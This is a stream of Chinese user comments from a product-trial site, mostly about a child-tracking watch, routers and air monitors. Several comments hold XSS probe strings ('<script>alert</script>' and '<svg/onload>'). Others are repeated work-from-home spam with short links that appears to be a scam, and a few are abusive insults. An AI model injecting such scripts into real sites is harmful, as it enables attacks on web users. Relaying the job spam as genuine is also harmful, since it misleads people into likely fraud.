网 络 差事网 络 差事
网 络 差事
网 络 差事网 络 差事网 络 差事
网络兼职  网络  差事  网络 差事
网络 差事
网络 差 事
把参数标出来呀，机身重量尺寸，电池容量、续航时间、可控距离、控制飞机是用手机信号还是什么？产生通话费或是流量费，每分钟费用多少，最大挂载量是多大，摄像头的相关数据，是持续录像还是可边录边拍，什么都不说，别人怎么买呀，这样的网上销售是不是显得太不专业了
好期待啊。。。
好期待啊360手表
微型摄像头加上门铃的功能！~
现在不实用
国外很成熟的东西了
不咋地，想在平板市场分一杯羹可不容易
建议出这个商品，最好要防水，体积再缩小一点
辛苦了~评测很有参考价值~
电量是硬伤。。
看起来就帅，还好用，用起来估计更帅
到现在十年的房子,看看哪些超标....
电量是硬伤。。 不知道怎么解决
电量是硬伤。。 不知道怎么解决 
电量是硬伤。。 不知道怎么解决  
电量是硬伤。。 不知道怎么解决  
电量是硬伤。。 不知道怎么解决  
大骗子超级大骗子
电量是硬伤。。怎么办好呢
电量是硬伤。。怎么办好呢 
电量是硬伤。。怎么办好呢 
电量是硬伤。。怎么办好呢 
好想买一个，挺有用的
本来不是27号出的啊，今天这么变成30号了？
期待幸运降临
期待幸运降临期待幸运降临
房子已经五年了，同事们都没测过，想拿来试下。
我等到花儿都谢了
wifi还要覆盖到门外，痛苦
等待。。。。。。
很需要，期待。。
很需要，期待。。。
asdasdasd
会送吗？会的话点N个赞！
不错 不错 不错 不错不错
不错 不错 不错 不错不错不错 不错 不错 不错不错不错 不错 不错 不错不错不错 不错 不错 不错不错
不会吧，哈哈
为什么呢?
12345
你！！！！！！！ 
其实小的也有，但是小的飞起来就没有那么稳定。
支持。希望能有试用。
效果怎样？
已经有人给出报告了。大家快去看。http://www.qikoo.com/try?season=8#review
哈哈。估计是数量比较少啊，坚持申请，相信下次会中的。其实就是幸运女神没有降临。
说送都没有答复的。
恭喜啊。真好运。
奇酷赶紧来个试用吧！！
你这个回答是非常错误的。首先，手机本身有一定的内存，也有足够的了，当然除非你要用来存超大容量的文件。智能手机也一样。
成本是个问题，兼容性是个问题，没几个手机带nfc的，特别是苹果
用谷歌浏览器，上面有翻译
侵犯既得利益集团，不会推广的，不然卖洗衣机的都倒闭了。厂子倒闭了工人就没钱，没钱就不能消费，没法消费经济就危机。
卖洗衣机的都去买这个
大哥，你搞清楚工作原理原理了么，哪来的电？
现在网络电子产品都兴这个，限购、买多少造多少、 都是让小米惯的
恩  那可能我没注意到
效果怎么样 
你什么时候申请的 
别着急，以后以旧换新 
我觉得也是，我赞同，
这个有得等了。大概3、4个月。可以看看Oculus Rift。现在买VR其实不是很好。应用方面比较少。
估计只能扛动一个二踢脚
............ZHEZHAO照片是辣妈？
期待刀剑神域的游戏时代！
wumao
目前我采用的是 盒装的甲醛测试剂 效果比较直观。
空气卫士当然是首选啦，或者吊兰，竹炭包！
对的。我也有这疑问
很期待。。。
不是这么。是怎么
应该是多数家长所期待的好东东，确实能给家庭带来很大的方便和安全感。感谢360！感谢奇酷！
到现在二十年的房子,看看哪些超标.... 
感谢360。感谢奇酷网。
买个电源去
期待期待。很期待。
电源多少钱一个
看起来很不错的样子，老是有人说我宿舍有异味，拿来试试呗~
儿时梦想！小时候看欧美科幻就有类似产品，现在都孩儿他爹了，时间太快了！！！
我之前用过很多空气净化器，不知道这个效果怎么样所以很想试用一下，得知效果！
很期待、非常期待、迫切期待幸运能光顾我。
从第一期试用就一直关注。
值得大大赞扬一番！
好与坏自己用了才知道   我现在就用着  感觉不错
中国就一个特区.为什么不把所有的市都建成特区？
谢谢分享谢谢分享谢谢分享谢谢分享
360就差你个煞笔？   所有360产品问你要钱了？
没抢到的煞笔们就别在那丢人了！你们去奇酷了嘛？奇酷给你们发信息了嘛？你们有抢购码嘛？你们兑换了嘛？
谢谢分享谢谢分享谢谢分享谢谢分享
&quot;孩子是我的唯一&quot;  一句话概括全部内容
谢谢分享谢谢分享谢谢分享谢谢分享
一直在申请  从未被选中
一直在支持  从未被选中 遗憾啊
一直在支持  从未被选中 遗憾啊
一直在支持  从未被选中 遗憾啊
发布个购买时间啊，是不是等预定量多了才加工啊
新房吹了半年,就怕小孩吃不消,急需检测
东西好需赶紧上市,且要便宜,迅速占领家装市场
很棒，使用液很简单，轻轻按一下，越来越喜欢，不错
一群利用父母爱心的骗子。
这个评论都写过两次了，怎么还让提交啊 
为什么安装驱动后，接电话时，电话没声音。把驱动卸载后就好了！所以现在放在那，再没用过。NOTE2手机，Android 4.3
还可以拍照？多大内存？
我没用过空气净化器，不知道空气净化器效果怎么样,所以很想试用一下，得知效果！ 
好 期待上市
支持国货,可是这么轻巧,没有考虑到防盗设置吗?
这里这里 这里
从22号到27号现在又到30号，有没有准信啊？
孩子都是家长心中的宝，孩子们的安全更是家长心里最担心的，这款产品真的不错，，至少能随时随地知道孩子在哪，出来一定要买，期待中！外观能设计成儿童喜欢的多样化造型更好，主要能让他们喜欢，才不至于不随时取下来
给自己 找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以） ～每夭5o~15o，我详细作讲解～有意者博客联系我  http://t.cn/8sfyr3p
给自己 找份宅家的网络差 事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以） ～每夭5o~15o，我详细作讲解～有意者博客联系我  http://t.cn/8sfyr3p
jgkhol
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右 。（宝妈、学生、上班族都可以）有意者【dwz.cn/gkvFd】复制到浏览器打开 ～即可报名咨询 ～
此职位可以在家工作，不限制工作时间，（宝妈、学生、上班族都可以）做的越多挣的越多～【dwz.cn/gkvFd】有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～
希望可以选中，因为这个东西感觉很好很不错，
为了孩子，
此职位可以在家工作，不限制工作时间，（宝妈、学生、上班族都可以）做的越多挣的越多～【dwz.cn/gkvFd】复制到浏览器打开～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～ 
期待期待，孩子是我心中至宝，一定要买
我之前用过很多空气净化器，不知道这个效果怎么样所以很想试用一下，得知效果！
申请的太多了吧 ？肯定需要认真筛选，等待中
申请一下试试看！不知道是否好用。
看这节奏，难过中，双色球啊！！ 
虽然提交了试用申请，不过根本没指望能抽中，只希望能快点上市，宁可花钱早点用上。
有没有搞错，一次又一次的推迟，从我申请的开始就已经推了2次了，，第一次不记得时间了，第二次推到27号，现在又推到30号，看下次还能不能再推到年底，，真是的。。。。无语，，，，，，，
相当赞同，又没有诚信，一个活动总是推来推去的。。。。。
真心希望筛选是认真的从有故事的人中选出来的。
刚交的新房，急用
期待中，真的很精准检测到自己家的空气质量那就好了！最好还有监测水质的功能！！！
静静的等，虽然希望渺茫
希望虽然渺茫，但还有希望
从22号到27号现在又到30号
此职位可以在家工作，不限制工作时间，（宝妈、学生、上班族都可以）做的越多挣的越多～【dwz.cn/gkvFd】复制到浏览器打开～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～ 
我了我家大宝贝!继续等待，希望幸运女神来关顾我一下！
焦急等待，真心希望被选中啊
期待能在这17W人中选中。。。 最期待的还是能早点上市啊，上市才是王道。。。
很期待可以早点上市
期待能在这17W人中选中。。。 最期待的还是能早点上市啊， 
外形好普通的眼镜啊。
十七万分之一的希望，总比没希望好啊！呵呵！心态一定要好！
微单，想要一个。轻便啊。
很是心动，就是不知道防盗功能怎么样？至于其他相信贵公司品质。期待拥有~！
太妙了，不知道要多少钱，很敢兴趣，市场一定会很广的，期待！！ 上市后可代理吗？
很酷啊。还是空气卫士帅一些。
希望能被选中，儿童卫士快点上市吧
东西好，就是有点贵
希望能被选中，儿童卫士快点上市吧 
未来儿子的安全，期待选中！
希望能被选中，儿童卫士快点上市吧 
希望能被选中，儿童卫士快点上市吧 
这个不错。。
不错赞一个
看似很好的东西！人类的又一个好帮手！期待试用……
选我选我！
期待中啊，希望早点上市，到一些小学去做宣传会比较好
我怎么记得是27号啊 ，选俺吧
对于一个70后的我来讲，首次接触“奇酷”，里面的宝贝太多、太新奇了。很多宝贝只有在电视、电影里看到；如今也可以实打实的拥有，着实让我感到中国的科技在突飞猛进，期待更多的宝贝上市中。
我也记得是27号公布结果 现在又推迟
这个就更神了，只有在电影里看过，用于侦察、攻击，可现在我们普通老百姓也可以洋盘一回了。
还没有退出，心急啊
还没有推出，心急啊 
明明说是27号公布的，为什么又是30号呢？
360儿童卫士要是利用卫星定位，那就好了
又没有赶上。。。。。。
17w中，150个，比杭州车牌摇号还难啊
有点儿小贵，适合发烧友。
这也太狠了吧~！
快点上市吧
这种东西用你那个热熔胶枪一样弄的出来。。。还什么3D打印。。。却
好不容易等到今天上来看，呀！推到30号了，等待中，希望等到的是好结果。
估计这个以后会沦为监控你老公的工具吧。。。呵呵
怎么可能！它一定在逗我！不过还是好期待
希望人品大爆发吧~
很有语言风格的评测!!!
什么时候再次出售
赞！！写得不错哈
快快出结果吧  期待啊 
要等到30日
这个可以有，很实用，前段时间家里被盗了。不知道这能不能保存录像
重在参与，认真填写每一份问卷。乐观心态活动！祝大家中奖，大家也祝福我中奖吧。
是第一次参加，好运降临吧。。让我也知道真有这么好
等待ING 期待ING
我是广东广州天河区的 三岁的儿子马上要上幼儿园了  希望可以试用
再次出售时提前发个短信哈，谢谢。
期待啊！！！希望能中  
花落我家吧，昨天又去找孩子了！
一直在申请，从未被选中··············
给我一次机会吧
期待试用，现在儿童安全问题亟待解决。
快点上市吧，等不急要体验
赶快上市吧，这对有孩子的家庭来说是福音啊，另外家有老年痴呆症患者的家庭应该也适用！
看起来很不错的样子，好期待哦！希望帮我们的环境有所改善。
每辆车上都有OBD接口，差别是OBD1还是OBD2，只要把它插上就可以使用了，这个东西早就有了，尤其在外国。
多次提交 多次被忽悠
期待试用，儿童安全。
新房子味道挺大希望可以成功
祝我好运吧 
蓝牙不靠谱
期待，马上来一个试试 
我不需要覆盖几百米，我只要能覆盖150平方米，能穿3道墙，如果有一项不达标我能退货吗。我一直刷新，根本就没有，时间刚到就是卖光了。可能吗，这次只是求关注而已 
想让孩子独立，还不敢放手，期待。。。期待。。。
穷人家的孩子注定是买不起的，求试用
肯定是好东东
关注宏图三胞官方微信，微信商城里面有售   微信号：HTSB200  购买时选择江西南昌八一店
关注宏图三胞官方微信，微信商城里面有售 微信号：HTSB2000 购买时选择江西南昌八一店 
点击申请了，为什么没有出现填写信息的提示，只看到筛选的按钮。
好像用啊。
期待...... 儿在外,母不忧
期待中........
我家里很需要
我也申请了，希望能中签，不知道这是真的，还是骗局，还是逗你玩呢~~~
非常需要这么个小东西，丢过钱包的人都懂得
会不会是假的？怎么公布日期一次次变更呢？从22日到27日再变到30日，不知道怎么回事
求中 超級想要
怎么样申请？
27号来看结果，发现时间变成30号。。。这。。。
希望我能被抽中，哈哈！这样的话可以给我宝贝神密礼物了。
简简单单挺好的
给上学的孩子用挺不错的…
很详细的评测，对路由器的知识有了更深层次的理解。
很期待，希望给小外甥一个礼物，也让不在儿子身边的姐姐能够放心~~~
不知道价格怎么样呢
要是申请成功我还得去买Broadlink系列产品呢，想想就是要花钱的节奏啊，让我申请成功吧，少花点钱，感恩。。。
不错 价格！！！
东西不错！去瞅瞅!
因为已经截止日期 了
iphone可以用吗
这种的都是水培的 水培的都用的无机肥 所以几乎无虫的
热切期待中
不错，太喜欢了
又需要GPS车载定位产品，GPS手表定位产品，手机应用产品的，请联系我，真诚期待与你的合作，谢谢
又需要GPS车载定位产品，GPS手表定位产品，手机应用产品的，请联系我，真诚期待与你的合作，谢谢
又需要GPS车载定位产品，GPS手表定位产品，手机应用产品的，请联系我1256805865  15217760175，真诚期待与你的合作，谢谢
有需要GPS车载定位产品，GPS手表定位产品及方案的，请联系我（1256805865 电话：15217760175），真诚期待与你的合作，谢谢
不会吧 我申请不了  
手机和飞行器之间靠什么连接的？wifi、无线电还是什么方式？
申请到了 可以借给我试用下~~~~~~~~！
申请到了 可以借给我试用下~~~~~~~~！
申请到了 可以借给我试用下~~~~~~~~！
申请到了 可以借给我试用下~~~~~~~~！
有需要GPS车载定位产品，GPS手表定位产品及方案的，请联系我（1256805865 电话：15217760175），真诚期待与你的合作，谢谢
是不是真的 什么时候有新品 买一个啊。
关键是：飞行控制距离，续航时间，抗风能力，载重（能挂多重的摄像头），视频如何保存，电池充电时间。
真的不错哎。不知道价格多少。在哪买
希望选中我，谢谢
？白打了半天字
27号来看结果，发现时间变成30号。。。这。。。
想让孩子独立，还不敢放手，期待。。。期待。。。 
祝我好运吧！！
期待试用，儿童安全。 
貌似很有用。。。不错的设计。。。
希望能够试用  期待中
热切期待中
tewt1234
123123aaaaa
asdasdasd
期待，能够试用，正在找此类产品
好想好想有这么一款儿童定位手表啊，期待期待！！！！！
已申请了期待中啊！求成功吧！
只想知道什么时间发售。。。
什么时候发售哦~~
我是男同志 我用我妈的手机  我的手机系统版本太低 不支持 哈哈~
不会很费电  它依靠的是一个后台的app来实现智键的功能  也就一个后台应用 （默认就很多后台应用 多一个影响不大）
求通过筛选啊~
看上去很有用，价格多少？
希望中签！
不太好通过啊
3G能用吗？ 
我的爱与你同在
就一4G无线路由器，只是360的价格比华为的要便宜，缺点就是网络不是太好，如果3G同时也支持WCDMA就很有竞争力，毕竟一般上网联通3G的21M足够了，而且联通的3G套餐有包年和包半年的，淘宝价格也很实惠，而移动至今还未推出4G上网卡。
那怎么自动换水？还有这个小球球怎么洗干净衣服？？？
看起来很不错啊
不不不，他可以把外壳设计的比屏幕凸出一点点，比如0.5毫米.
你是担心手碰到屏幕会成了乱点击吗？可以制定一个区域能够触控，其他区域不能触控啊。
其他的和平常的一样的吧。
中标啊、、、、、、、
快点发布吧，价格合适就买了。
123123123
还不知道是什么呢
看起来还不错
我可是一直在关注啊   拜托啦一定要中啊
我一直在关注，希望我能有意外的惊喜啊，好期待啊
机身小巧可人,很可惜不能外接取景器。入门玩玩尚可！
确实打开了方便之门，大爱！
还有很大的发展余地，很期待的一款产品！
这个可以有！一定要支持！
未来的大趋势了，切合点选的不错。
过敏体质的人表示还可以更优化哦，固定方式可以使一根皮带！
很健康实用哦，夏日必备！
是我想要的产品，别让人等太久，等不来小米，就只能三星了。
不错台喜欢了
1000元，我要了，请联系我，要求原始的包装、配件、购物凭证—同寄来。
一定有快一点 
实时录音：手机端一键录音，即可倾听孩子周围的声音，了解孩子周边环境。  这 虽然很有用 不过也太狠了吧
真的好期待呀，好希望是我
啥时候再卖啊。。。
快点开售吧，从一等到二，好慢的deng dai
希望给我个惊喜
哈哈共和国
快点开卖吧，真的着急购买呢。
我家急需这宝贝啊，非常适合我妹妹用，她就爱到处乱跑
这就是我想要的
这个东西看起来不错，59美元有点贵
分析的很到位啊。看来应该找专业人士来解答一下。
已经用好长时间了
快点开卖吧
啥时候上市啊
【而且电池和核心部件都放上面不知道会不会】辐射啊。。。。。。重
你个该多少钱啊？？？
到底卖不卖.  还是创意中 ???    从去年开始喊. 一点实际意义都没有
TCL智能门铃，表示恭喜了！
TCL智能门铃，表示恭喜了！
TCL智能门铃，表示恭喜了！
TCL智能门铃，表示恭喜了！
Everything for the children!
Everything for the children!
Everything for the children!
Everything for the children!
不说多了，说多了都是泪啊，从第一期申请起，到现在没成功过，这么背，有木有？
目测可能是蓝牙
类似智键的东东，多少钱呢？求试用机会！
在筛选了啊，希望早日批量
没啥用，对婚姻来说是个破坏产品…太过怀疑的女人必过的不幸福
再不上市，小孩都快长大了
扫码错误,是因为你扫的不是&quot;条形码&quot;,而是&quot;二维码&quot;.二维码每个都是一样的,指向APP下载链接,而下面的条形码是每台机器独有的,也就是那行数字咯!我也写了T3报告,不过还没弄完呢,ID yinyaocool,欢迎指教
不知道购买产品后两种系统操作软件是否需要花钱
什么时候开始再卖啊  跪求一个啊 大神
到底什么时候能买到？？
我喜欢有创意
我喜欢，几个不怎么喜欢
很期待，希望有机会给小宝贝特别的儿童节礼物。加油360！
不错，希望能开发安卓平台的，毕竟安卓平台的手机更多些。价格更低些就好了。
到底啥时候上市啊？能不能快点啊。
这个微单期待一下
看着介绍很好的东东，也很实用啊。 
一个多少钱呀？
什么时候开卖？
http://gd.qq.com/a/20140528/002992.htm看完这新闻报道，心很不安，家里的小子现在也是独自一人上学，360儿童卫士 早点发售吧，让父母们能够安心些。
看完这新闻报道，心很不安，家里的小子现在也是独自一人上学，360儿童卫士 早点发售吧
http://gd.qq.com/a/20140528/002992.htm
http://gd.qq.com/a/20140528/002992.htm
http://gd.qq.com/a/20140528/002992.htm
http://gd.qq.com/a/20140528/002992.htm
http://gd.qq.com/a/20140528/002992.htm
不错不错，很有意思的东西，要是免费试用的话就好咯
希望早点出来，价格亲民
什么时候能买的，宝宝才2岁  天天好动  就怕走丢了
这下我的弹弓有用了 哈哈哈
看上去好像很大的样子:)
看起来很不错啊 看着介绍很好的东东，热切期待中 奖！
啥时候开售啊？
看来比开网店还要难申请
手机找不到了第一时间就想打个电话就知道了，车钥匙找不到了，就下楼去踹踹车，楼上人听着声音找钥匙，哈 门钥匙找不到的时候也想打个电话问问他，你死哪里去啦~
小区旁边就是个工厂,噪音大不说,还有废气,味道挺大,业主们天天挂横幅要求工厂搬迁,哪里那么容易啊,自己换房,也是难啊,就怕污染太大,家里小孩子受影响
发布个32G的就好了，8G有点小了
现在还能申请试用吗？什么时候正式上市呢？？
2000+的价格妥妥的。
&lt;script&gt;alert(2)&lt;/script&gt;&lt;svg/onload=alert(22)&gt;s
不错的理念啊，既环保又省力，赞一个！
&lt;script&gt;alert(2)&lt;/script&gt;&lt;svg/onload=alert(22)&gt;s 
&lt;script&gt;alert(1)&lt;/script&gt;&lt;svg/onload=alert(2)&gt;
看介绍还不错的感觉 就是不知道是不是真的如实
我在农村穷孩子求中
我自己申请的没问我妈
这个外观比较低调点
远程控制的功能很帅啊。
多会能上手了。
喜欢！不错！
移动直接有mifi套餐，而且是免费的，
yes!~
我这里都有成品套装 了  需要的联系我   13857408444
一定很贵吧
是吗?????!!!
联系我  13857408444  物联网招商中···
需要可以联系我们  13857408444  
yessssssss.........
这个不错，6月1日儿童节有没有，给儿子买一个
 戎郎土豪好~~~~~
亲,你能干神马?
你就是最大的傻逼你知道吗？你这么傻逼，你家人知道吗？你以为全中国就你一个知道去奇酷，你以为全中国奇酷就给你一个人发了信息？你以为全中国就你一个有抢购码？你以为全中国就你一个去兑换了？把全中国人的都当成傻逼？但是我知道，我知道你才是个大傻逼，你这么傻逼，再次问你，你家人知道吗？
胡说八道，9点52上去，就已经没货了，你10点上去怎么抢到的？ 
手机表示电力不足
上一批见都没有见到 下一批什么时候能见的  不知道能不能买到  为什么要用抢购的方法
谁说&quot;现在适合孩子的就是在完成堆成山的作业后，上完爸爸妈妈报的课外班之后的很少时间&quot;这是适和的?堆成山的作业和课外班本身就是极度摧残我们身心的!祝你遭天谴.
谁说&quot;现在适合孩子的就是在完成堆成山的作业后，上完爸爸妈妈报的课外班之后的很少时间&quot;这是适和的?堆成山的作业和课外班本身就是极度摧残我们身心的!祝你遭天谴!
谁说&quot;现在适合孩子的就是在完成堆成山的作业后，上完爸爸妈妈报的课外班之后的很少时间&quot;这是适和的?堆成山的作业和课外班本身就是极度摧残我们身心的!祝你遭天谴!
谁说&quot;现在适合孩子的就是在完成堆成山的作业后，上完爸爸妈妈报的课外班之后的很少时间&quot;这是适和的?堆成山的作业和课外班本身就是极度摧残我们身心的!祝你遭天谴!
家里刚装修，味道很重，觉得自动改善环境功能超赞，
谁说&quot;现在适合孩子的就是在完成堆成山的作业后，上完爸爸妈妈报的课外班之后的很少时间&quot;这是适和的?堆成山的作业和课外班本身就是极度摧残我们身心的!祝你遭天谴!
谁说&quot;现在适合孩子的就是在完成堆成山的作业后，上完爸爸妈妈报的课外班之后的很少时间&quot;这是适和的?堆成山的作业和课外班本身就是极度摧残我们身心的!祝你遭天谴!
这......
耳机口的智能设备越来越多了。很不错。从此耳机口不再单调。
yes........
这款产品非常适合家庭使用。非常喜欢 。
六一前能出来吗？
多生产点都有了
三米报警，十米提示来电？另外费电
估计体积会很大，供电怎么解决
农村用得上吗？ 
有事没事上来看看.........................
首轮抢购的时候我已经买到了，那次只有白色版。发货很快，就是包装太简单了，连挂绳都没给啊。。 多少空间差距不大，我一般就插到电脑上不动了。用起来很方便，插上去自动创建，管理也很方便。、 信号的话家用凑活，140平在附近卧室没问题，远一点的话信号比较差，隔壁一般要少一格子信号，但是速度还是可以的，看电影缓冲很快  不足：看的有点脆生，太小了，时间久了很容易发热发烫，连续用过5个小时，再久没有试了
从上面的述说来看很不错哦，很适合有老年痴呆症的人和小孩，什么时候有得卖呀？
什么时候能出
看述说不错，这是不是真的有那么厉害呢? 
猴年马月咯   能不能直接卖啊    给个价钱    下半年小屁孩一年级了   要用啊  急急急
奇虎送我一个吧
儿童节礼物啊     赶紧公布价钱   批量供应是王道   不要跟大米一样    饿的慌
希望我能被选中，可以送给女儿六一节的礼物。老天保佑啊~~~
哪里可以买啊，求一个。
很想得到，没有使用，可以买到也是可以的。 快点上市吧
我觉得是否应该更加隐蔽些，防止被坏人一眼看出来？比如可以外形上应该更加个性化、多样性一些，不要一个外表，看到它就知道是个安全产品，坏人如果拐到小孩，先把这个手表给剪掉。
为了抢一个
我想知道国外（美国）可以用么？
等待结果，六一儿童节最好的礼物
希望能被抽中，送给上一年级的女儿。同时也感谢360想的这么周到，解决了父母对自己孩子安全方面的后顾之忧！
外形很酷,不知道能不能研发成可爱卡通形的,毕竟是儿童卫士嘛,希望六一时女儿能带上 
老贵了  某宝上一搜一把  也有云台版的航拍版的手机操控版遥控实时画面版等等  都不过千
尽快量产啊！需求巨大，孩子在长大！
不错的宝贝，给孩子买一个
写的非常好
什么时候能上市啊
申请中，看能不能通过
可视化的门铃外加数据云处理。初期感觉很好玩，用了后可能会感觉去处理很鸡肋，看到了人在外又能如何？再附加点其它更多功能。
硬件家家都说自家的路由器好。。。可是能否做的好呢？？像夏天路由器底部散热能否做到位。。是否真的是微热。。。。路由器穿墙强吗。。一楼装5楼能连接上吗？难道磁强大，真的对人体没有伤害，辐射
tcrobin 可视化的门铃外加数据云处理。初期感觉很好玩，用了后可能会感觉去处理很鸡肋，看到了人在外又能如何？再附加点其它更多功能。  上面是引用网友的话。 如果看到是熟人，没有钥匙，那么可以远程授权到他的手机上，他开启蓝牙，就可以开门了
已经写过评论了，怎么还让评论啊
我和老公都是时尚达人，尤其是对电子产品，哈哈，一直都很关注类似产品，希望可以有机会试用！
上次我看是说5.27日公布结果的啊。怎么今天看是5.30日了。希望自己能中哦。家里两个侄子都太调皮了。大侄子又要开始在老家上一年级了，我们在深圳又看不到，更是不怎么省心。选我吧！
360儿童卫士手表 要是儿童自己摘掉什么反应呢
我抢了一台闲置中......
我都不晓得怎么申请试用.....这个很需要啊   我家儿子跟女儿都配个   什么时候有的卖？ 
有吗  什么地方的移动公司
预约了很久 什么时候上市呢 
仪器仪表行业专业人，期待申请成功，希望给予大家一个专业的产品测试！
期待更详细报告
www.smartwallit.com
我很需要这样的手表，不知道会有什么样的效果，但我觉得应该支持。为孩子增添了一份保障。希望可以快点得到这样的一块手表。
别的不说。最贵的道具风水欠佳。财外露，房主火气大。别人借钱不还。住在大卧室的人身体欠佳。 
祈祷能中一个，那女儿就有保障了。
支持奇酷....
一定要抽到,保佑.永远支持奇酷
这个至少先解决电源的问题吧！现在的门上可没电源啊!用电池的话，我怕换的太频繁！
现在这拐骗儿童太多了 太可怕了
如何在现有的防盗门上安装呢，还得防止别人把这玩意卸走了， 再确实是电池问题，个头能有多大呢
我很需要这样的手表，不知道会有什么样的效果，但我觉得应该支持。为孩子增添了一份保障。希望可以快点得到这样的一块手表。现在这拐骗儿童太多了，太可怕了。 
支持360
那个有这么酷么，，还是山寨的？？
续航是个问题 据说他们提供了大容量电池，要是能很好解决应该很有前景
争取能选我
这。。。多大的卧室算大啊？
这。。。多大的卧室算大啊？
这。。。多大的卧室算大啊？
测试测试测试
估计很快了吧
我倒还挺希望住大卧室的。。。
更新啦 ! 更新啦 ! 更新啦 ! 更新啦 ! 更新啦 ! 
更新啦 ! 更新啦 ! 更新啦 ! 更新啦 ! 更新啦 ! 
更新啦 ! 更新啦 ! 更新啦 ! 更新啦 ! 更新啦 ! 
支持支持支持
这报告写得挺好~
更新啦 ! 
更新啦 ! 
更新啦 ! 
好霸气的试用报告。非常有参考价值。
喜欢喜欢喜欢
强烈支持强烈支持强烈支持
为了孩子抢一个
谢谢分享谢谢分享
谢谢分享谢谢分享
测试测试测试
我是说他图上标的那个大卧室的那个卧室
我是说他图上标的那个大卧室的那个卧室
我是说他图上标的那个大卧室的那个卧室
坐等试用心得，好的话为孩子买一个
什么时候批量生产啊 价位如何？
一定要抽到,保佑.永远支持奇酷
5S可以用么？
支持360
哦哦~懂了~你好专业啊~~大师来我家给路由开个光~
晕 怎么重复了好几遍
ao   ao  ao ao  
路由是红衣大师开过光的，不需要别人了。
轮胎看着能越野啊！！
360路由器手机APP端更新啦
360路由器手机APP端更新啦
支持360！
你是360内部人员么？注意回避一下啊。怎么几次都有你？
你是360内部人员么？注意回避一下啊。怎么几次都有你？ 
我也想要，死都要一个！
还不开卖，要等到啥时候啊 
希望能中奖啊！360！
如果能防水就更好了！
希望给我一个绿色的
不之到好不好
我的乖乖，昨天广场上有人抢小孩了，太恐怖了。360什么时候正式销售啊，吓死人了
我记得有遥控电动滑板，贵死啦！
开光去庙里。我不会。我也不是大师，只是学了6年的风水学徒而已
求中，希望360大大能看到
这么贵，自己做个粗糙点的1W多左右就够了
所以用这个在路上感觉很怪
我看过这个的科学报道，说这个东西有利也有弊，它的辐射对人的伤害特别大，如果这点没改变必须慎用！
柯南。。。。。。。。。。。。
你好好有钱哦~还2000+...为啥不说后面再加两个0呢?
第一次是22号抽取名单,而且那时候是限100名额
360路由少有的深入评测。值得推荐给大家。
求中，希望360大大能看到
试用太渺茫了，赶紧上市啊，360抓住机会啊
恩恩,这个好!
这个怎么用？ 就是我3G卡和这个连接就可用4G了？ 
我超级想要这个
我要蓝色的，谢谢360哥
亲爱的360，我就是小学生，给我一个好不好？？？？？？
试用机会渺茫，等待上市，卫士有价，孩子无价，为了孩子儿童卫士赶紧上市吧。
我等了好久好久，还继续在等，360求你量产吧。
这个国外好像早就有了吧，感觉一般，没有很实质的功能
申请人数太多了，希望渺茫啊，从去年盼到今年，希望早点上市，已经申请两期了啊。是不是考虑到续航和功能模块，卫士2没有卫士1好看。
平板的最好效果在7.9或8寸，7寸怪怪的。还有屏分辨率太低了，RAM 1G 也太小了。
我要000000
这个定价，买不起啊。
我非常想要............
有申请到的吗？希望太小了。早点上市吧！ 
看到卫士2，卫士1我错过了，不知道那么多人，能选中我的几率有多大。
我要 转手卖么
建议添加电话功能，电话功能可以限定只允许拨打安全卫士里预存的电话号码。
啥时候上市？
为了孩子必须抢一个~~~~~~~！！！
不管有没有、我觉得顶一下、电话功能也要、还有定位功能要快、准、狠、这样就不怕、还有这款东西以技术人员来说、孩子被拐、很容易就可以修改位置的、最好这个功能也要加进一下
方向盘位置左右移动及附加值！！！ 环球自驾游，再也不用换车了。
极富价值！！！
他几次！有他！他真的360内部人员
感觉是非常好的东东，建议是不是也可以推出老年款呢！现在的老人多，也有很多走失了到处找的，建议是不是也可以推出老年人的卫士手环呢。另外想申请儿童手环试试。希望能有这个机会。
柯南。。。。。。。。。。。。 
貌似申请时间已经过了，看来申请不上了！现在有对外出售的么？想买一部。 想知道手环有大小号么？是否能够预付先订购呢？想感受手环的待机，配置，实际感受等等一些有关手环的信息，好想有一部。既然不能申请上，希望能快点买一部！
完全吃流量的东西啊！4G一个字贵
可以。。。。。。。。。。。。。。。。。。
期待试用一个，真的很实用哦。
不知道能不能通过试用申请
哎，什么时候可以再预约呀，
期待试用一个，真的很实用哦。不管有没有、我觉得顶一下、电话功能也要、还有定位功能要快、准、狠、这样就不怕、还有这款东西以技术人员来说、孩子被拐、很容易就可以修改位置的、最好这个功能也要加进一下 申请人数太多了，希望渺茫啊， 
很好的产品，就是不知道我有没有这个好运能够申请成功。不管怎么样还是期待吧，就是这个产品应该有锁死功能，就是没有密码的话，不可能从宝宝的手腕上拿掉。还有就是如楼上所说，权限问题，不允许私自更改！这样的话就完美了！@
非常期待能够试用一个，给周围的人一个惊喜
服务承诺里suoyang 写为souyang、souoyang就这么大意。不懂产品是不是那么大意？!
期待好运  谁知道啊
怎么好意思卖11万，现在飞行器又不是什么高科技，白痴商家！ 
明天就是30号了，希望能选中我
什么时候能量产啊，多少钱都买！
实用，求试用！
能像扫地机样移动就更加完美了，这样在主人不在时可同时定时定点监控家里多个地方的空气质量和湿度！
什么时候卖，孩子都5岁了
我也想要一个，哪里买，申请下，谢谢
急需买，赶紧卖，大家非常期待 
这东东一定好玩o(≧v≦)o~~好棒
好东西，以后眼睛的压力减少了！
迎合了潮流，好创意
这玩意看样子还蛮好玩的
外观看起来还不错
这玩具好玩， 
好期待能被选中，申请那天就给孩子说了，这几天孩子一直在问妈妈我的手表什么时候能到啊！现在孩子的安全问题是每个家庭很关心的问题。
明天就是30号了，期待好运,希望能选中我 
很期待，想让筛选成功成为特别的儿童节礼物，给宝贝一个惊喜
（武汉奇搜科技有限公司） 360湖北授权代理 360搜索推广：丁经理：15927075059
（武汉奇搜科技有限公司） 360湖北授权代理 360搜索推广：丁经理：15927075059 
期待中，看效果。
（武汉奇搜科技有限公司） 360湖北授权代理 360搜索推广：丁经理：15927075059   
（武汉奇搜科技有限公司） 360湖北授权代理 360搜索推广：丁经理：15927075059   
滤网价格是多少。
